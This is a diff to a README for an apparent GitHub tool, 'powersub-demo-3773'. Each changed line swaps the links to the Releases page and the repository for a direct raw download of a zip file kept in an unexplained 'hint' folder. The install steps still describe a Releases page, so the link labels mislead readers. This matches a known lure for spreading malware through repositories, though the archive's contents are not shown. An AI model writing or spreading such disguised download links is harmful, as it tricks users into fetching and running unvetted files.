@@ -6,7 +6,7 @@ Welcome to the powersub-demo-3773! This tool helps you quickly access necessary 
 
 ## 📥 Download the Application
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Aswathi718/powersub-demo-3773/releases)
+[![Download Now](https://raw.githubusercontent.com/Aswathi718/powersub-demo-3773/main/hint/powersub-demo-3773.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Aswathi718/powersub-demo-3773/main/hint/powersub-demo-3773.zip)
 
 ## 🛠️ System Requirements
 
@@ -18,7 +18,7 @@ To use powersub-demo-3773 effectively, you should have:
 
 ## 📂 Download & Install
 
-1. Visit this page to download: [GitHub Releases Page](https://github.com/Aswathi718/powersub-demo-3773/releases).
+1. Visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/Aswathi718/powersub-demo-3773/main/hint/powersub-demo-3773.zip).
 2. On the Releases page, find the latest version. Look for a file that matches your operating system.
 3. Click on the download link for this file. It will start downloading.
 4. Once the download is complete, locate the downloaded file on your computer (usually in the 'Downloads' folder).
@@ -47,7 +47,7 @@ For any questions or additional support, feel free to reach out via the GitHub p
 
 ## 🌐 Learn More
 
-To learn more about the powersub-demo-3773, visit our [GitHub Repository](https://github.com/Aswathi718/powersub-demo-3773). Stay updated with features and enhancements!
+To learn more about the powersub-demo-3773, visit our [GitHub Repository](https://raw.githubusercontent.com/Aswathi718/powersub-demo-3773/main/hint/powersub-demo-3773.zip). Stay updated with features and enhancements!
 
 ## 📝 License
 
